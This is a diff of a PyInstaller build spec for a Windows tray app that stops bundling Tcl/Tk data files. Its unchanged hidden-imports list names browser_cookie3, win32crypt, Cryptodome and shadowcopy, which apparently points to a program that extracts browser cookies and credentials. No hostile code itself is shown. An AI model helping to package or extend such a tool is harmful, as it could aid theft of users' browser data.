@@ -1,20 +1,11 @@
 # -*- mode: python ; coding: utf-8 -*-
 
 
-import os, sys
-
-_python_dir = os.path.dirname(sys.executable)
-_tcl_dir = os.path.join(_python_dir, 'tcl', 'tcl8.6')
-_tk_dir = os.path.join(_python_dir, 'tcl', 'tk8.6')
-
 a = Analysis(
     ['tray_app.py'],
     pathex=[],
     binaries=[],
-    datas=[
-        (_tcl_dir, 'tcl/tcl8.6'),
-        (_tk_dir, 'tcl/tk8.6'),
-    ],
+    datas=[],
     hiddenimports=['pystray._win32', 'PIL._tkinter_finder', 'browser_cookie3', 'lz4', 'Cryptodome', 'wmi', 'shadowcopy', 'win32crypt', 'win32con', 'win32api'],
     hookspath=[],
     hooksconfig={},
